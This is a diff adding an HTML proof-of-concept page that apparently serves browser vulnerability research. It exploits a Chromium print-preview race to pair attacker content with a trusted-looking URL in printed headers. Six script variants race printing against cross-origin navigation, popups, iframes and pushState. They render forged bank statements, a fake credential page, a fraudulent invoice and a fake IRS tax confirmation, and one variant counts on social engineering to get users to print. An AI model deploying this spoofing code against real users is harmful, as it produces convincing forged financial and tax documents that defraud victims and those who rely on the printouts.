@@ -1,1 +1,451 @@
-<h1>hi</h1>
+<!DOCTYPE html>
+<html>
+<head>
+<title>PoC 6b: Print + Cross-Origin Navigation Race (Escalated)</title>
+<!--
+  VH-2026-006b: Print Dialog Content/URL Desync
+
+  Target: Chromium 146+ (Desktop)
+
+  Core Bug: window.print() opens a print preview dialog. The print preview
+  renders live DOM — not a frozen snapshot. This creates a TOCTOU window:
+
+  Attack Vectors:
+    A) "Print then Navigate" — call print(), then location.href = bank.com
+       If print header updates to bank.com but preview still shows attacker content
+       → cross-origin URL spoofing in printed document
+
+    B) "Navigate then Print" — start navigation to bank.com, immediately print()
+       During the navigation commit, the URL bar may already show bank.com
+       while the old (attacker) content is still rendered in print preview
+
+    C) "Popup print relay" — open popup, navigate it, then print it
+       Opener controls timing of popup.print() relative to popup navigation
+
+    D) "Print preview content injection" — print() captures live DOM,
+       setTimeout modifies DOM during print preview rendering.
+       The @media print CSS + beforeprint/afterprint events give precise timing.
+
+  Security Impact:
+    - Printed document shows bank.com URL in header/footer
+    - Content is entirely attacker-controlled
+    - Physical printed documents carry legal/trust weight
+    - Victims may use printouts as proof of account balance, transactions, etc.
+-->
+</head>
+<body style="font-family: -apple-system, sans-serif; padding: 40px; background: #f0f0f0;">
+
+<h2>PoC 6b: Print + Navigation Content/URL Desync</h2>
+<p>Tests whether print preview can show attacker content with a victim-origin URL in the print header.</p>
+
+<div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
+  <button onclick="testA_printThenNavigate()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
+    A: Print → Cross-Origin Nav
+  </button>
+  <button onclick="testB_navigateThenPrint()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
+    B: Cross-Origin Nav → Print
+  </button>
+  <button onclick="testC_popupPrintRelay()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
+    C: Popup Print Relay
+  </button>
+  <button onclick="testD_liveDOMInjection()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
+    D: Live DOM Injection During Print
+  </button>
+  <button onclick="testE_beforeprintSwap()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #fd7e14; color: #fff; border: none; border-radius: 8px;">
+    E: beforeprint Event Content Swap
+  </button>
+  <button onclick="testF_iframePrintNav()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #e83e8c; color: #fff; border: none; border-radius: 8px;">
+    F: iframe Print + Nav Race
+  </button>
+</div>
+
+<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
+
+<script>
+function log(msg) {
+  const el = document.getElementById('log');
+  if (!el) return; // DOM may be swapped
+  el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+  el.scrollTop = el.scrollHeight;
+}
+
+// ============================================================
+// VARIANT A: Print then Cross-Origin Navigate
+// ============================================================
+// Hypothesis: window.print() opens print preview. If we then
+// navigate to bank.com, Chrome may update the print header URL
+// to bank.com while the preview still shows our content.
+function testA_printThenNavigate() {
+  log('[A] Setting up attacker content...');
+
+  // First, set up convincing content
+  document.title = 'Account Statement - Q1 2026';
+
+  // Use beforeprint to time the navigation precisely
+  window.addEventListener('beforeprint', function onBefore() {
+    window.removeEventListener('beforeprint', onBefore);
+    log('[A] beforeprint fired — print preview is rendering');
+
+    // Navigate DURING print preview render
+    // Try multiple timings
+    setTimeout(() => {
+      log('[A] Attempting cross-origin navigation during print...');
+      location.href = 'https://www.google.com/';
+    }, 50);
+  });
+
+  // Swap to attacker content, then print
+  document.body.innerHTML = `
+    <style>
+      @media print {
+        body { margin: 0; padding: 40px; font-family: Arial, sans-serif; }
+        .no-print { display: none; }
+      }
+    </style>
+    <div style="font-family: Arial; max-width: 700px; margin: 0 auto; padding: 40px;">
+      <div style="border-bottom: 2px solid #1a73e8; padding-bottom: 10px; margin-bottom: 20px;">
+        <h1 style="margin: 0; color: #1a73e8;">Global Trust Bank</h1>
+        <p style="margin: 4px 0; color: #666;">Account Statement — Q1 2026</p>
+      </div>
+      <table style="width: 100%; border-collapse: collapse;">
+        <tr style="background: #f8f9fa;"><th style="padding: 8px; text-align: left; border: 1px solid #dee2e6;">Date</th><th style="padding: 8px; text-align: left; border: 1px solid #dee2e6;">Description</th><th style="padding: 8px; text-align: right; border: 1px solid #dee2e6;">Amount</th></tr>
+        <tr><td style="padding: 8px; border: 1px solid #dee2e6;">2026-01-15</td><td style="padding: 8px; border: 1px solid #dee2e6;">Wire Transfer - Acme Corp</td><td style="padding: 8px; text-align: right; border: 1px solid #dee2e6;">$45,000.00</td></tr>
+        <tr><td style="padding: 8px; border: 1px solid #dee2e6;">2026-02-01</td><td style="padding: 8px; border: 1px solid #dee2e6;">Direct Deposit - Salary</td><td style="padding: 8px; text-align: right; border: 1px solid #dee2e6;">$12,500.00</td></tr>
+        <tr><td style="padding: 8px; border: 1px solid #dee2e6;">2026-03-10</td><td style="padding: 8px; border: 1px solid #dee2e6;">International Transfer</td><td style="padding: 8px; text-align: right; border: 1px solid #dee2e6;">$89,750.00</td></tr>
+      </table>
+      <p style="margin-top: 20px; color: #666; font-size: 12px;">
+        Current Balance: <strong>$147,250.00</strong><br>
+        Account: ****4521 | Routing: 021000021
+      </p>
+    </div>
+  `;
+
+  // Trigger print
+  setTimeout(() => window.print(), 100);
+
+  log('[A] CHECK: Does the print header URL change to google.com?');
+  log('[A] CHECK: Does the print preview still show our bank statement?');
+}
+
+// ============================================================
+// VARIANT B: Navigate then Print (race the commit)
+// ============================================================
+// Hypothesis: Start a slow cross-origin navigation, then call
+// print() before the new page loads. The URL bar may already
+// show the target URL while our content is still rendered.
+function testB_navigateThenPrint() {
+  log('[B] Starting navigation to slow-loading target...');
+
+  // Set up our fake content first
+  document.title = 'Secure Banking Portal';
+  document.body.innerHTML = `
+    <style>
+      @media print {
+        body { margin: 0; padding: 40px; font-family: Arial; }
+      }
+    </style>
+    <div style="font-family: Arial; max-width: 600px; margin: 0 auto; padding: 40px;">
+      <h2>Login Credentials Recovery</h2>
+      <p>Your temporary credentials have been generated:</p>
+      <div style="background: #f8f9fa; padding: 16px; border-radius: 4px; font-family: monospace;">
+        Username: admin@company.com<br>
+        Temp Password: Tr0ub4dor&3<br>
+        Valid until: 2026-04-06
+      </div>
+      <p style="color: #666; font-size: 12px;">Print this page for your records. This page will expire.</p>
+    </div>
+  `;
+
+  // Start navigation (this is async — the page doesn't change immediately)
+  // Use an anchor click to start the navigation
+  const a = document.createElement('a');
+  a.href = 'https://accounts.google.com/'; // Slow-ish target
+  a.click();
+
+  // Immediately trigger print before the navigation commits
+  // The navigation is pending — URL bar may show loading state
+  window.print();
+
+  log('[B] Navigation started + print() called simultaneously');
+  log('[B] CHECK: What URL appears in the print preview header?');
+  log('[B] CHECK: Does the print capture our content or google.com?');
+}
+
+// ============================================================
+// VARIANT C: Popup Print Relay
+// ============================================================
+// Hypothesis: Open a popup to attacker page with fake content.
+// Navigate the popup to bank.com, then immediately call
+// popup.print(). Does the print capture the attacker content
+// with bank.com URL?
+function testC_popupPrintRelay() {
+  log('[C] Opening popup with attacker content...');
+
+  const popup = window.open('about:blank', 'printTarget', 'width=800,height=600');
+  if (!popup) { log('[C] Popup blocked!'); return; }
+
+  // Write attacker content to the popup
+  popup.document.write(`
+    <!DOCTYPE html>
+    <html>
+    <head><title>Invoice #2026-0405</title></head>
+    <body style="font-family: Arial; padding: 40px; max-width: 700px; margin: 0 auto;">
+      <style>@media print { body { margin: 0; padding: 30px; } }</style>
+      <h1 style="color: #333;">INVOICE</h1>
+      <p>Invoice #2026-0405 | Date: April 5, 2026</p>
+      <hr>
+      <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
+        <tr style="background: #f0f0f0;"><td style="padding: 8px; border: 1px solid #ddd;">Consulting Services</td><td style="padding: 8px; border: 1px solid #ddd; text-align: right;">$25,000.00</td></tr>
+        <tr><td style="padding: 8px; border: 1px solid #ddd;">Platform License</td><td style="padding: 8px; border: 1px solid #ddd; text-align: right;">$15,000.00</td></tr>
+        <tr style="font-weight: bold;"><td style="padding: 8px; border: 1px solid #ddd;">Total Due</td><td style="padding: 8px; border: 1px solid #ddd; text-align: right;">$40,000.00</td></tr>
+      </table>
+      <p style="color: #666;">Payment due within 30 days. Wire to: Account ****8832</p>
+    </body>
+    </html>
+  `);
+  popup.document.close();
+
+  log('[C] Attacker content written to popup');
+
+  // Now navigate the popup to a legitimate URL
+  setTimeout(() => {
+    log('[C] Navigating popup to legitimate URL...');
+    popup.location.href = 'https://www.google.com/';
+
+    // Immediately try to print BEFORE navigation commits
+    // The popup's DOM still has our invoice content
+    setTimeout(() => {
+      try {
+        popup.print();
+        log('[C] popup.print() called during navigation');
+      } catch(e) {
+        log('[C] popup.print() blocked: ' + e.message);
+        // Fallback: try via the popup's own context
+        try {
+          popup.eval('window.print()');
+          log('[C] popup.eval print() attempted');
+        } catch(e2) {
+          log('[C] All print attempts blocked: ' + e2.message);
+        }
+      }
+    }, 10); // Very tight timing — before navigation commits
+  }, 500);
+
+  log('[C] CHECK: Does popup print show invoice content with google.com URL?');
+}
+
+// ============================================================
+// VARIANT D: Live DOM Injection During Print Preview
+// ============================================================
+// This is what you already confirmed works. The print preview
+// renders live DOM. We can modify content AFTER print() is called
+// and it appears in the preview.
+//
+// Security impact: Combined with pushState, the printed document
+// shows a convincing URL path with attacker content.
+function testD_liveDOMInjection() {
+  log('[D] Testing live DOM injection timing...');
+
+  // Step 1: pushState to a convincing URL BEFORE print
+  history.pushState({}, '', '/accounts/statement/2026-Q1.pdf');
+  document.title = 'Statement_Q1_2026.pdf';
+  log('[D] URL changed to: ' + location.href);
+
+  // Step 2: Set up initial benign-looking content
+  document.body.innerHTML = `
+    <style>
+      @media print {
+        body { margin: 0; padding: 40px; font-family: 'Times New Roman', serif; }
+        .no-print { display: none; }
+      }
+      @page { margin: 1cm; }
+    </style>
+    <div id="content" style="font-family: 'Times New Roman', serif; max-width: 700px; margin: 0 auto; padding: 40px;">
+      <p>Loading document...</p>
+    </div>
+  `;
+
+  // Step 3: Use beforeprint event for precise injection timing
+  window.addEventListener('beforeprint', function handler() {
+    window.removeEventListener('beforeprint', handler);
+    log('[D] beforeprint fired — injecting content NOW');
+
+    document.getElementById('content').innerHTML = `
+      <div style="text-align: center; margin-bottom: 30px;">
+        <h1 style="margin: 0; font-size: 24px;">FIRST NATIONAL BANK</h1>
+        <p style="margin: 4px 0; color: #666;">Personal Account Statement</p>
+        <p style="margin: 4px 0; color: #666;">Period: January 1 — March 31, 2026</p>
+      </div>
+      <div style="border: 1px solid #ccc; padding: 12px; margin-bottom: 20px;">
+        <strong>Account Holder:</strong> John Smith<br>
+        <strong>Account No:</strong> ****4521<br>
+        <strong>Statement Date:</strong> April 1, 2026
+      </div>
+      <table style="width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 14px;">
+        <tr style="background: #eee;">
+          <th style="padding: 6px; border: 1px solid #ccc; text-align: left;">Date</th>
+          <th style="padding: 6px; border: 1px solid #ccc; text-align: left;">Description</th>
+          <th style="padding: 6px; border: 1px solid #ccc; text-align: right;">Debit</th>
+          <th style="padding: 6px; border: 1px solid #ccc; text-align: right;">Credit</th>
+          <th style="padding: 6px; border: 1px solid #ccc; text-align: right;">Balance</th>
+        </tr>
+        <tr><td style="padding: 6px; border: 1px solid #ccc;">01/02</td><td style="padding: 6px; border: 1px solid #ccc;">Opening Balance</td><td style="padding: 6px; border: 1px solid #ccc;"></td><td style="padding: 6px; border: 1px solid #ccc;"></td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$124,500.00</td></tr>
+        <tr><td style="padding: 6px; border: 1px solid #ccc;">01/15</td><td style="padding: 6px; border: 1px solid #ccc;">WIRE TFR - ACME CORP</td><td style="padding: 6px; border: 1px solid #ccc;"></td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$45,000.00</td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$169,500.00</td></tr>
+        <tr><td style="padding: 6px; border: 1px solid #ccc;">02/01</td><td style="padding: 6px; border: 1px solid #ccc;">PAYROLL - EMPLOYER INC</td><td style="padding: 6px; border: 1px solid #ccc;"></td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$12,500.00</td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$182,000.00</td></tr>
+        <tr><td style="padding: 6px; border: 1px solid #ccc;">02/14</td><td style="padding: 6px; border: 1px solid #ccc;">POS - LUXURY STORE</td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$3,200.00</td><td style="padding: 6px; border: 1px solid #ccc;"></td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$178,800.00</td></tr>
+        <tr><td style="padding: 6px; border: 1px solid #ccc;">03/01</td><td style="padding: 6px; border: 1px solid #ccc;">PAYROLL - EMPLOYER INC</td><td style="padding: 6px; border: 1px solid #ccc;"></td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$12,500.00</td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$191,300.00</td></tr>
+        <tr><td style="padding: 6px; border: 1px solid #ccc;">03/10</td><td style="padding: 6px; border: 1px solid #ccc;">INTL WIRE - OVERSEAS</td><td style="padding: 6px; border: 1px solid #ccc;"></td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$89,750.00</td><td style="padding: 6px; border: 1px solid #ccc; text-align: right;">$281,050.00</td></tr>
+      </table>
+      <div style="margin-top: 30px; padding-top: 10px; border-top: 1px solid #ccc; font-size: 12px; color: #666;">
+        <p>This statement is generated electronically and is valid without signature.</p>
+        <p>First National Bank | FDIC Insured | Member FDIC</p>
+      </div>
+    `;
+  });
+
+  // Step 4: Also inject via setTimeout for redundancy
+  setTimeout(() => {
+    const content = document.getElementById('content');
+    if (content && content.textContent.includes('Loading')) {
+      log('[D] Fallback: beforeprint did not fire, injecting via timeout');
+      // Content will be injected by beforeprint instead
+    }
+  }, 200);
+
+  // Step 5: Trigger print
+  setTimeout(() => {
+    log('[D] Triggering print...');
+    window.print();
+  }, 100);
+
+  log('[D] CHECK: Print header/footer URL shows: ' + location.href);
+  log('[D] CHECK: Print preview shows injected bank statement content');
+  log('[D] CHECK: The printed PDF looks like a legitimate bank statement');
+}
+
+// ============================================================
+// VARIANT E: beforeprint + afterprint Content Swap
+// ============================================================
+// The beforeprint/afterprint events give us precise control
+// over what content appears ONLY in print vs screen.
+// This itself is by-design, but combined with URL spoofing...
+function testE_beforeprintSwap() {
+  log('[E] Testing beforeprint/afterprint content swap...');
+
+  // Set URL to something convincing
+  history.pushState({}, '', '/secure/tax-return-2025.html');
+  document.title = 'Tax Return 2025 - IRS e-File Confirmation';
+
+  // Normal screen content — looks like a loading page
+  const normalContent = `
+    <div style="font-family: Arial; text-align: center; padding: 100px 40px;">
+      <h2>Processing your request...</h2>
+      <p>Please wait while we generate your document.</p>
+      <div style="width: 200px; height: 4px; background: #eee; margin: 20px auto; border-radius: 2px;">
+        <div style="width: 60%; height: 100%; background: #1a73e8; border-radius: 2px;"></div>
+      </div>
+    </div>
+  `;
+
+  // Print-only content — a convincing tax document
+  const printContent = `
+    <div style="font-family: 'Courier New', monospace; max-width: 700px; margin: 0 auto; padding: 20px;">
+      <div style="text-align: center; margin-bottom: 20px;">
+        <h2 style="margin: 0;">Department of the Treasury — Internal Revenue Service</h2>
+        <h3 style="margin: 4px 0;">e-File Confirmation — Tax Year 2025</h3>
+      </div>
+      <hr>
+      <p><strong>Taxpayer:</strong> JOHN Q SMITH</p>
+      <p><strong>SSN:</strong> ***-**-4521</p>
+      <p><strong>Filing Status:</strong> Single</p>
+      <p><strong>Adjusted Gross Income:</strong> $185,400.00</p>
+      <p><strong>Total Tax:</strong> $38,922.00</p>
+      <p><strong>Refund Amount:</strong> $4,231.00</p>
+      <hr>
+      <p style="font-size: 11px;">Confirmation #: EF-2026-0405-78432<br>
+      Submitted: April 5, 2026 at 2:14 PM EST<br>
+      This confirmation is for your records.</p>
+    </div>
+  `;
+
+  document.body.innerHTML = normalContent;
+
+  window.addEventListener('beforeprint', () => {
+    document.body.innerHTML = printContent;
+    log('[E] beforeprint: swapped to tax document content');
+  });
+
+  window.addEventListener('afterprint', () => {
+    document.body.innerHTML = normalContent;
+    log('[E] afterprint: restored normal content');
+  });
+
+  // Social engineering: tell user to print
+  log('[E] Content set. User sees "loading" screen.');
+  log('[E] If user prints (Ctrl+P), they see a fake tax return.');
+  log('[E] The URL path shows: ' + location.href);
+  log('[E] Try: Ctrl+P or call window.print() from console');
+
+  // Auto-trigger after a short delay to demonstrate
+  setTimeout(() => {
+    log('[E] Auto-triggering print...');
+    window.print();
+  }, 2000);
+}
+
+// ============================================================
+// VARIANT F: iframe Print + Navigation Race
+// ============================================================
+function testF_iframePrintNav() {
+  log('[F] Testing iframe print + navigation race...');
+
+  document.body.innerHTML += `
+    <iframe id="targetFrame" src="about:blank" style="width:800px;height:400px;border:1px solid #ccc;margin-top:20px;"></iframe>
+  `;
+
+  const frame = document.getElementById('targetFrame');
+
+  frame.onload = function() {
+    // Check if we can access the frame content
+    try {
+      const fdoc = frame.contentDocument;
+      if (!fdoc) throw new Error('No document access');
+
+      fdoc.write(`
+        <html><head><title>Confidential Report</title></head>
+        <body style="font-family: Arial; padding: 20px;">
+          <h1>Quarterly Financial Report</h1>
+          <p>Revenue: $2.4M | Expenses: $1.8M | Net: $600K</p>
+          <p>This document is confidential and for internal use only.</p>
+        </body></html>
+      `);
+      fdoc.close();
+      log('[F] Attacker content written to iframe');
+
+      // Navigate the iframe to a legitimate URL
+      setTimeout(() => {
+        frame.src = 'https://www.google.com/';
+        log('[F] iframe navigating to google.com...');
+
+        // Try to print the iframe content during navigation
+        try {
+          frame.contentWindow.print();
+          log('[F] iframe print() called during navigation');
+        } catch(e) {
+          log('[F] iframe print blocked: ' + e.message);
+        }
+      }, 500);
+
+    } catch(e) {
+      log('[F] Frame access error: ' + e.message);
+    }
+  };
+
+  // Trigger the initial about:blank load handler
+  frame.src = 'about:blank';
+
+  log('[F] CHECK: Does iframe print capture attacker content with google.com URL?');
+}
+</script>
+</body>
+</html>
